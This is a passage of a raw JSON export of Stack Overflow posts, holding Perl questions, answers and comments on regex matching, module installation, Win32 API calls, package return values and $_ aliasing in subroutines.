$commandoutput[0];\n</code></pre>\n\n<p>Here i had tried to store the print <code>$commandoutput[0]</code> in the variable inside the subroutine.I gated here how to pass the variables from outside to inside the subroutine.</p>\n\n<pre><code>sub gen_help_data\n{\n  my $lines=shift;\n  print $lines;\n}\n</code></pre>\n"}, {"tags": ["perl", "sftp", "perl-module"], "answers": [{"comments": [{"owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "edited": false, "score": 0, "creation_date": 1485582953, "post_id": 41892131, "comment_id": 70995680, "body": "Chankey any 3-d party tool u can suggest which can perform these SFTP Task and can be integrated with Perl. Any Open Source and command line one."}, {"owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "edited": false, "score": 0, "creation_date": 1485583064, "post_id": 41892131, "comment_id": 70995699, "body": "And can we install Net::SSH2 using CPAN, it is also giving error for missing libraries."}], "tags": [], "owner": {"reputation": 19192, "user_id": 257635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/El2tc.jpg?s=128&g=1", "display_name": "Chankey Pathak", "link": "https://stackoverflow.com/users/257635/chankey-pathak"}, "is_accepted": true, "score": 1, "last_activity_date": 1485513987, "last_edit_date": 1495542258, "creation_date": 1485513987, "answer_id": 41892131, "question_id": 41890958, "link": "https://stackoverflow.com/questions/41890958/installing-netsftp-and-netssh2-without-cpan/41892131#41892131", "title": "Installing Net::SFTP and Net::SSH2 without CPAN", "body": "<p><strong>1.</strong> Net::SSH2 is not in offical PPM repositories. Install it using below:</p>\n\n<pre><code>ppm install http://www.sisyphusion.tk/ppm/Net-SSH2.ppd\n</code></pre>\n\n<p>Tested on Windows 7 and Perl 5.18.4</p>\n\n<p><a href=\"https://i.stack.imgur.com/vKHh1.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/vKHh1.png\" alt=\"enter image description here\"></a></p>\n\n<p><strong>2.</strong> For Math::Pari check this answer <a href=\"https://stackoverflow.com/questions/39991235/unable-to-install-mathpari-module\">Unable to install Math::Pari module</a></p>\n"}], "owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1039, "favorite_count": 0, "accepted_answer_id": 41892131, "answer_count": 1, "score": 1, "last_activity_date": 1485514108, "creation_date": 1485510312, "last_edit_date": 1485514108, "question_id": 41890958, "link": "https://stackoverflow.com/questions/41890958/installing-netsftp-and-netssh2-without-cpan", "title": "Installing Net::SFTP and Net::SSH2 without CPAN", "body": "<p>I am making a Perl script to fetch files from a Unix Server using SFTP. I want to search the file using Regex and then download it to my system folder. I am using ActivePerl and Windows 64 bit environment. I looked on various posts which suggested the best way is using <a href=\"http://search.cpan.org/~salva/Net-SFTP-Foreign-Backend-Net_SSH2-0.09/lib/Net/SFTP/Foreign/Backend/Net_SSH2.pm\" rel=\"nofollow noreferrer\">Net::SFTP::Foreign::Backend::Net_SSH2</a> but I am facing lots of errors while installing Net::SFTP and Net::SSH2.I cannot CPAN from my system and tried with GCC and dmake. Net::SFTP is halting at Math::Pari and Net::SSH2 is asking for libraries libssh2. I downloaded libssh2 from <a href=\"https://www.libssh2.org/download/\" rel=\"nofollow noreferrer\">here</a> but not able to install it.</p>\n\n<p>Also can I use any 3-d part OS tools like psftp through Perl to server my requirements.</p>\n"}, {"tags": ["regex", "perl", "file-handling"], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 2, "last_activity_date": 1485510634, "creation_date": 1485510634, "answer_id": 41891062, "question_id": 41890910, "link": "https://stackoverflow.com/questions/41890910/perl-file-reading-and-regex-matching/41891062#41891062", "title": "Perl File Reading and RegEx Matching", "body": "<p>To match all occurrences of a regex, you need to use the <code>/g</code> modifier.</p>\n\n<p>Also, as the argument to <code>for</code> is evaluated in list context, it would return all the matches at once, so using <code>$1</code> would return the same value (the last one) for each match; but you can use the loop variable instead:</p>\n\n<pre><code>for ($line =~ /(\\d{1,2}[ABC])/g) {\n    print \" $_\";\n}\n</code></pre>\n\n<p>But, it's common to loop over the matches with <code>while</code> instead, as it returns the matching parts one by one, without the need to have a long list of matches. Here, you need <code>$1</code>, as the loop condition is evaluated in scalar context:</p>\n\n<pre><code>while ($line =~ /(\\d{1,2}[ABC])/g) {\n    print \" $1\";\n}\n</code></pre>\n\n<p>Notes: Your input doesn't contain <code>|</code>, so I removed it from the character class.</p>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 2, "last_activity_date": 1485510776, "creation_date": 1485510776, "answer_id": 41891112, "question_id": 41890910, "link": "https://stackoverflow.com/questions/41890910/perl-file-reading-and-regex-matching/41891112#41891112", "title": "Perl File Reading and RegEx Matching", "body": "<p>The match as you wrote it captures <em>once</em> and it stops. So the <code>for</code> loop is over that one number that is inside <code>(line =~ ...)</code>.  </p>\n\n<p>You can instead use the <code>/g</code> <em>modifier</em> which will make regex to keep going and find all matches. If you assign that to an array then the operator is in the <em>list context</em> and it returns all matches</p>\n\n<pre><code>my @matches = $line =~ /\\d{1,2}[A-C]/g;\n</code></pre>\n\n<p>Here you don't need the capturing parenthesis since you take the whole match. When in doubt add them. If you simply need any numbers followed by any letters you can use <code>/\\d+\\w+/g</code> instead.</p>\n\n<p>I'd like to make a few more comments.</p>\n\n<ul>\n<li><p>Please <em>always</em> start your programs with <code>use warnings;</code> and <code>use strict;</code></p></li>\n<li><p>Always, <em>always</em> check calls like <code>open</code></p></li>\n</ul>\n\n<p>Altogether</p>\n\n<pre><code>use warnings 'all';\nuse strict;\nuse feature qw(say);\n\nmy $path=\"file.txt\";\n\nopen my $fh, \"&lt;\", $path  or die \"Can't open $path: $!\";\n\nwhile (my $line = &lt;$fh&gt;)\n{\n    my @matches = $line =~ /(\\d{1,2}[A-C])/g;\n\n    say \"@matches\";\n}\n\nclose $fh;\n</code></pre>\n"}], "owner": {"reputation": 63, "user_id": 7329427, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f7ddcd596818756a5410df1a39989c08?s=128&d=identicon&r=PG&f=1", "display_name": "traveller", "link": "https://stackoverflow.com/users/7329427/traveller"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7034, "favorite_count": 0, "accepted_answer_id": 41891112, "answer_count": 2, "score": 1, "last_activity_date": 1485510776, "creation_date": 1485510170, "question_id": 41890910, "link": "https://stackoverflow.com/questions/41890910/perl-file-reading-and-regex-matching", "title": "Perl File Reading and RegEx Matching", "body": "<p>I'm doing a little perl script, but i've some problem while reading file, and than iterate over regex.</p>\n\n<p>In particulary the file is over multiple line, and for each line, i need to extract some value, i post an example to understand better.</p>\n\n<p>This is sample line of file</p>\n\n<pre><code>            1A    OCC OCC  4B  5B  6B  7B  8B    9A\n      OCC OCC    12B 13B 14B OCC 16B 17B 18B   OCC OCC\n</code></pre>\n\n<p>i need to match for the first, second, n..,  line separetly:\n1A\n4B\n5B\n6B\n7B\n...</p>\n\n<p>excecpt OCC.</p>\n\n<p>i wrote this code:</p>\n\n<pre><code>my $path=\"file.txt\";\n\nopen (my $fh, \"&lt;\", $path);\n\n while(my $line = &lt;$fh&gt;)\n {\n    for ($line =~/(\\d{1,2}[A|B|C])/){   \n      print \" $1\";  \n }\n}\n</code></pre>\n\n<p>The result that i obtained is only match for the first occurance matched on the line.\n1A 12B </p>\n\n<p>How can i extend  for read all line and match the content correctly?</p>\n\n<p>The print result is only for my debugging test.</p>\n"}, {"tags": ["perl", "perl-module", "mod-perl"], "comments": [{"owner": {"reputation": 19192, "user_id": 257635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/El2tc.jpg?s=128&g=1", "display_name": "Chankey Pathak", "link": "https://stackoverflow.com/users/257635/chankey-pathak"}, "edited": false, "score": 1, "creation_date": 1485507220, "post_id": 41889844, "comment_id": 70962153, "body": "<code>SendMessageTimeout</code> is a method of <code>Win32::GUI</code> module. You may use it as <code>Win32::GUI::SendMessageTimeout(MSG, WPARAM, LPARAM, [FLAGS], TIMEOUT);</code>"}, {"owner": {"reputation": 77, "user_id": 3152688, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/0040bea961c2a5b609f707be4849ad76?s=128&d=identicon&r=PG&f=1", "display_name": "SoothingMusic", "link": "https://stackoverflow.com/users/3152688/soothingmusic"}, "reply_to_user": {"reputation": 19192, "user_id": 257635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/El2tc.jpg?s=128&g=1", "display_name": "Chankey Pathak", "link": "https://stackoverflow.com/users/257635/chankey-pathak"}, "edited": false, "score": 0, "creation_date": 1485517518, "post_id": 41889844, "comment_id": 70968302, "body": "Thank you @ChankeyPathak. I installed win32-gui module and compiled -- it worked fine locally."}], "owner": {"reputation": 77, "user_id": 3152688, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/0040bea961c2a5b609f707be4849ad76?s=128&d=identicon&r=PG&f=1", "display_name": "SoothingMusic", "link": "https://stackoverflow.com/users/3152688/soothingmusic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1485506519, "creation_date": 1485506519, "question_id": 41889844, "link": "https://stackoverflow.com/questions/41889844/sendmessagetimeout-api-in-perl", "title": "SendMessageTimeout API in Perl", "body": "<p>I am trying to replace SendMessage API with SendMessageTimeout in an installation script (that refreshes the environment -- registry and stuff). After replacing the installer is crashing. I have compiled the sub routine separately and it works alright. </p>\n\n<p>Is it because SendMessageTimeout is in a different module -- Win32::GUI? I am unable to find a source to download this module. Apologies for the naivety, I am totally new to Perl and this is the only change I had to make.</p>\n\n<pre><code>use Win32::API;  \n\nsub refreshEnvironment()\n{\nuse constant WM_WININICHANGE =&gt; 0x001A;\nuse constant HWND_BROADCAST  =&gt; 0xffff;\nuse constant SMTO_ABORTIFHUNG =&gt; 0x0002;\n\n    print(\"Refreshing the environment.\\n\");\n    my $sm = new Win32::API(\n            \"user32\",\n            \"SendMessageTimeout\",\n            ['N', 'N', 'I', 'P', 'N','I', 'P'], 'N'\n        );\n\n    if (! defined ($sm)) {\n        print(\"SendMessage api did not initialize.\\n\");\n        return;\n    }\n\n    my $buffer = \"Environment\";\n\n    my $res = $sm-&gt;Call(HWND_BROADCAST, WM_WININICHANGE, 0, $buffer, SMTO_ABORTIFHUNG, 2000, NULL);\n    print(\"SendMessage refresh environment done\\n\");\n}\n\nrefreshEnvironment();\n</code></pre>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485588475, "post_id": 41888429, "comment_id": 70996579, "body": "We don&#39;t actually see the code that is using the package. It looks like a script because of the shebang but there is nothing under the package. If the op only does perl or perl -w to the shown code it&#39;s not even a real module. It&#39;s just code in a different package than main."}, {"owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485588811, "post_id": 41888429, "comment_id": 70996649, "body": "@simbabque: It doesn&#39;t just &quot;look like a script&quot;; rather, the OP explicitly described it as one, and said that he ran it. I don&#39;t know why you expect there to be any other code using the package; the OP&#39;s experiment makes perfect sense as-is."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485589382, "post_id": 41888429, "comment_id": 70996785, "body": "It does, but I read the second part of your answer as when you are putting the package not in its own file but in the same as the script that&#39;s using it. Then you don&#39;t need <code>use</code> but you could still <code>import</code> if you wanted and there was no need for the true statement. Everything you say is correct, but that case is missing."}, {"owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485589930, "post_id": 41888429, "comment_id": 70996932, "body": "@simbabque: I&#39;m sorry, I don&#39;t understand your last comment. What case is missing?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485592975, "post_id": 41888429, "comment_id": 70997530, "body": "I think I just started from a different angle. Just re-read your answer again. It&#39;s fine like it is. I must not have been fully awake. Sorry :-)"}, {"owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485593626, "post_id": 41888429, "comment_id": 70997677, "body": "@simbabque: No worries. :-)"}], "tags": [], "owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "is_accepted": false, "score": 3, "last_activity_date": 1485500317, "creation_date": 1485500317, "answer_id": 41888429, "question_id": 41888392, "link": "https://stackoverflow.com/questions/41888392/what-happens-if-you-dont-put-1-at-the-end-of-a-package/41888429#41888429", "title": "What happens if you don&#39;t put 1; at the end of a package?", "body": "<p>When you <code>use</code> a <code>.pm</code> file, the file must return a true value (such as <code>1</code>) to indicate success, or else the <code>use</code> statement will fail and compilation will be aborted.</p>\n\n<p>But packages, as such, don't have to end with a true value; it's just that usually each package goes in its own <code>.pm</code> file, and the file needs the <code>1</code> in order to be <code>use</code>-able. In your example, where the package is put directly inside an executable script, no <code>1</code> is needed.</p>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485502657, "post_id": 41888467, "comment_id": 70960057, "body": "@ThisSuitIsBlackNot  Thank you, you are right, it must be that.  I&#39;ve adjusted the answer. It wasn&#39;t clear enough to me that <code>package Name;</code> is designed to be run.  And I&#39;ve seen shebang line at all kinds of places."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485502722, "post_id": 41888467, "comment_id": 70960087, "body": "I don&#39;t think it&#39;s designed to be run, the OP is just new and doesn&#39;t know how modules work yet."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485503495, "post_id": 41888467, "comment_id": 70960389, "body": "@ThisSuitIsBlackNot Right,  that seems clear (now). I didn&#39;t get it fully right away."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 7, "last_activity_date": 1487241892, "last_edit_date": 1487241892, "creation_date": 1485500506, "answer_id": 41888467, "question_id": 41888392, "link": "https://stackoverflow.com/questions/41888392/what-happens-if-you-dont-put-1-at-the-end-of-a-package/41888467#41888467", "title": "What happens if you don&#39;t put 1; at the end of a package?", "body": "<p>This is a little tricky.  It is simply required, if the package will be loaded by <code>use</code> or <code>require</code>.</p>\n\n<p>From <a href=\"http://perldoc.perl.org/functions/require.html\" rel=\"nofollow noreferrer\">require</a></p>\n\n<blockquote>\n  <p>The file must return true as the last statement to indicate successful execution of any initialization code, so it's customary to end such a file with <code>1;</code> unless you're sure it'll return true otherwise. But it's better just to put the <code>1;</code>, in case you add more statements.</p>\n</blockquote>\n\n<p>The <a href=\"http://perldoc.perl.org/functions/use.html\" rel=\"nofollow noreferrer\">use</a> comes down to <code>require</code>, so whenever you <code>use</code> a module the last statement that returns must return true, otherwise the compilation fails. A simple way to ensure this is to put <code>1;</code> at the end. If you never <code>use</code> (or <code>require</code>) that package <em>then</em> you don't have to have the <code>1</code> (true) in it.  </p>\n\n<p>The code in a file brought into the program via <code>use</code> actually runs and it must end up returning true, as required by <code>require</code>. If the file is read in in another way then there is no notion of 'return'. </p>\n\n<p>If it is run as an executable then again there is no requirement on true return, since <code>require</code> isn't involved. However, we generally write packages in order to <code>use</code> them, not to run them as programs. So practically speaking there should <em>always</em> be a <code>1;</code> at the end. </p>\n\n<p>The <a href=\"http://perldoc.perl.org/perlmod.html\" rel=\"nofollow noreferrer\">perlmod</a> would also be required reading.</p>\n\n<hr>\n\n<p>Here is a simple example.  This </p>\n\n<p>File <strong>Mod.pm</strong></p>\n\n<pre><code>package Mod;\n\n# print \"hello\\n\";    # works with this line uncommented\n</code></pre>\n\n<p>File <strong>script.pl</strong></p>\n\n<pre><code>use Mod;\n</code></pre>\n\n<p>when run by <code>perl script.pl</code> prints</p>\n\n<pre>\nMod.pm did not return a true value at main.pl line 1.\nBEGIN failed--compilation aborted at main.pl line 1.\n</pre>\n\n<p>When a package is <code>use</code>d it <em>must</em> return a true value.  If the last return is from a statement which happens to return true, like the commented out <code>print</code>, then all is well again.</p>\n\n<p>But we can run <code>perl Mod.pm</code> regardless of what it returns.</p>\n"}], "owner": {"reputation": 449, "user_id": 7368555, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/BzlYb.jpg?s=128&g=1", "display_name": "sureshkumar", "link": "https://stackoverflow.com/users/7368555/sureshkumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 656, "favorite_count": 1, "accepted_answer_id": 41888467, "answer_count": 2, "score": 4, "last_activity_date": 1487241892, "creation_date": 1485500091, "last_edit_date": 1495535383, "question_id": 41888392, "link": "https://stackoverflow.com/questions/41888392/what-happens-if-you-dont-put-1-at-the-end-of-a-package", "title": "What happens if you don&#39;t put 1; at the end of a package?", "body": "<p>What happens if you don't put <code>1;</code> at the end of a package? For example, if I remove the <code>1;</code> from the following script, the code still runs:</p>\n\n<pre><code>#!/usr/bin/perl\n\npackage Foo;\nprint \"Begin and Block Demo\\n\";\n\nBEGIN { \n    print \"This is BEGIN Block\\n\" \n}\n\nEND { \n    print \"This is END Block\\n\" \n}\n\n1;\n</code></pre>\n\n<p>Is the <code>1;</code> mandatory for package creation? I saw <a href=\"https://stackoverflow.com/questions/3606528/why-do-you-have-to-put-a-1-at-the-end-of-a-perl-5-module\">this question</a>, but it doesn't explain what happens if the <code>1;</code> is omitted.</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 75, "user_id": 7333198, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34ece592fe858f6fcf881f4cba57da18?s=128&d=identicon&r=PG&f=1", "display_name": "Divya Kiran Kadiyala", "link": "https://stackoverflow.com/users/7333198/divya-kiran-kadiyala"}, "edited": false, "score": 0, "creation_date": 1485483371, "post_id": 41885481, "comment_id": 70954605, "body": "Thanks Joshua. I have refactored my code as described. This works fine except that I get &quot;Uninitialized $_ error in substitution s///&quot; with $line in accessing the file. Hence I used $_ instead of $line to fix this issue and rest everything works fine now."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1485484558, "post_id": 41885481, "comment_id": 70954851, "body": "Your comment that &quot;This is a different $_&quot; is incorrect. The problem is that inside the <code>for</code> loop, <code>$_</code> is aliased to a constant (the string &quot;O3CPU.py&quot;), but <code>while &lt;$fh&gt;</code> does an automatic assignment to <code>$_</code>. You can get the same behavior by doing <code>$_ = &quot;foo&quot; for qw(bar baz)</code>."}, {"owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "edited": false, "score": 0, "creation_date": 1485491029, "post_id": 41885481, "comment_id": 70956147, "body": "Divya: The quick fix is to just use <code>$_</code> on your inner loop. Alternatively, each call to <code>s&#47;&#47;</code> will need to refer to the var name explicitly, ie <code>if ( $line =~ s&#47;foo\\s+&#47;foo &#47; || $line =~ s&#47;bar\\s+&#47;bar&#47; )</code>,etc."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 75, "user_id": 7333198, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34ece592fe858f6fcf881f4cba57da18?s=128&d=identicon&r=PG&f=1", "display_name": "Divya Kiran Kadiyala", "link": "https://stackoverflow.com/users/7333198/divya-kiran-kadiyala"}, "edited": false, "score": 0, "creation_date": 1485551092, "post_id": 41885481, "comment_id": 70988233, "body": "@DivyaKiranKadiyala  It may be the following. The <code>$v =~ &#47;...&#47;  || &#47;...&#47;</code> is really <code>($v =~ &#47;...&#47;) || (&#47;...&#47;)</code>, because of precedence. But that is <code>($v =~ &#47;...&#47;) || ($_ =~ &#47;...&#47;)</code> because of regex match operator&#39;s default.  When you assign <code>$line = &lt;$fh&gt;</code> there is no <code>$_</code> any more (it&#39;s undef), thus the error. So either use <code>$_</code> (and no <code>$line</code>) for <code>if (&#47;...&#47; || &#47;...&#47;)</code> or use <code>$line</code> in every match, <code>($line =~ &#47;...&#47; || $line =~ &#47;...&#47;)</code>."}, {"owner": {"reputation": 75, "user_id": 7333198, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34ece592fe858f6fcf881f4cba57da18?s=128&d=identicon&r=PG&f=1", "display_name": "Divya Kiran Kadiyala", "link": "https://stackoverflow.com/users/7333198/divya-kiran-kadiyala"}, "edited": false, "score": 0, "creation_date": 1485596658, "post_id": 41885481, "comment_id": 70998392, "body": "Thanks Joshua and zdim. I changed my substitution regex as ($line =~ /.../ || $line =~ /.../) and it worked fine, Thanks for the quick reply"}], "tags": [], "owner": {"reputation": 2177, "user_id": 3124587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/adc0af022f8a3b35bcde0a4405e4c673?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/3124587/joshua"}, "is_accepted": false, "score": 2, "last_activity_date": 1485477775, "creation_date": 1485477775, "answer_id": 41885481, "question_id": 41885151, "link": "https://stackoverflow.com/questions/41885151/error-while-processing-multiple-files-in-sub-routine-argument/41885481#41885481", "title": "Error while processing multiple files in sub-routine argument", "body": "<p>The problem is perl doesn't like your nested uses of the anonymous <code>$_</code> variable:</p>\n\n<pre><code>sub config_parser {\n    foreach (@_) {\n        # $_ is in scope here\n        if ( !open HANDLE1, \"&lt;\", \"$_\" ) { \n            die \"Cannot open $_: $!\";\n        }   \n        while (&lt;HANDLE1&gt;) {\n            # This is a different $_\n            chomp $_;\n        }\n    }   \n}\n</code></pre>\n\n<p>Give your loop variables names... It will also make your code more readable. I would also recommend using lexical filehandles instead of the old-stlye GLOBAL ones.</p>\n\n<pre><code>sub config_parser {\n    for my $filename (@_) {\n        open my $fh, '&lt;', $filename\n          or die \"Cannot open $filename: $!\";\n        while ( my $line = &lt;$fh&gt; ) {\n            chomp $line;\n            if ( $line =~ (...) ) { \n                ...;\n            }\n        }\n    }\n}\n}\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 7333198, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34ece592fe858f6fcf881f4cba57da18?s=128&d=identicon&r=PG&f=1", "display_name": "Divya Kiran Kadiyala", "link": "https://stackoverflow.com/users/7333198/divya-kiran-kadiyala"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1485477775, "creation_date": 1485475270, "last_edit_date": 1485476439, "question_id": 41885151, "link": "https://stackoverflow.com/questions/41885151/error-while-processing-multiple-files-in-sub-routine-argument", "title": "Error while processing multiple files in sub-routine argument", "body": "<p>I am trying to execute the below script and perl says that the read-only variable is getting modified. I couldn't find which variable is getting modified in this program. Can anyone please help me how to fix this error in the below script ?</p>\n\n<pre><code> 1. use strict;\n 2. use warnings;\n 3. use diagnostics;\n 4. use vars;\n 5. use 5.010;\n 6. #--------------------------------------------#\n 7.\n 8. my @array;\n 9. if (! open STDERR, \"&gt;\", \"error.txt\") {\n10.      die \"cannot open the Error file for write\";}\n11. &amp;config_parser ('O3CPU.py','config.ini');\n12. #print \"\\nNo of elemnts is \". scalar @temp. \"\\n\";\n13.\n14. sub config_parser {\n15.             foreach (@_) {\n16.                 \n17.             if (! open HANDLE1, \"&lt;\", \"$_\" ){\n18.                 die \"Cannot open $_: $!\"; } \n19. \n20.             my @array;\n21.             while (&lt;HANDLE1&gt;) {\n22.             \n23.                 chomp $_;   \n24.                 if ($_=~ (s/Fetch\\s?width/Fetch width /i)               || \n25.                             (s/Issue\\s?width/Issue width /i)                ||\n26.                         (s/Decode\\s?width/Decode width /i)      ||\n27.                         (s/Rename\\s?width/Rename width /i)      ||\n28.                         (s/wb\\s?width/Writeback width /i)       || \n29.                         (s/Commit\\s?width/Commit width /i)          ||\n30.                         (s/LQEntries/Load queue size /i)            ||\n31.                         (s/SQEntries/Store queue size /i)           ||\n32.                         (s/ROBEntries/ROB buffer size /i)       ||\n33.                         (s/Int\\s?Regs/Integer registers /i)             ||\n34.                         (s/Float\\s?Regs/Floating point registers /i)    ||\n35.                         (s/Pred\\s?Type/Branch predictor type /i)    ||\n36.                         (s/Global\\s?pred\\w+/Global predictor size/i) ||\n37.                         (s/Local\\s?pred\\w+/Local predictor size/i)  ||\n38.                         (s/Local\\s?Hist\\w+/Local History table size/i)\n39.                        \n40.                     ){\n41.                          print \"$_\\n\";\n42.                          push @array, \"$_\";\n43.                          }\n44.\n45.                                 }   # END of While Loop\n46.                         }\n47. #return @array;             # Return the collected results in an array.\n48. close HANDLE1;              # Close the file handle.\n49.  }      # END of the 